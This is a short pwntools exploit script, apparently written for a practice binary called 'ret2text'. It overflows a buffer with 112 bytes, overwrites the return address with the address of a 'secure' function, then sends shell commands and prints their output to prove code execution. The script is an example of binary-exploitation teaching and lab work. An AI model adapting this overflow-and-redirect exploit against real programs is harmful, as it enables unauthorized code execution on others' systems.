#!/usr/bin/env python3
from pwn import *
import time
context.log_level='error'
context.arch='i386'
BIN='../src/ret2text'
e=ELF(BIN)
payload=b'A'*112+p32(e.symbols['secure'])
io=process(BIN)
io.sendline(payload)
time.sleep(0.4)
io.sendline(b'echo PWNED_RET2TEXT; id; exit')
print(io.recvall(timeout=5).decode('utf-8','replace'))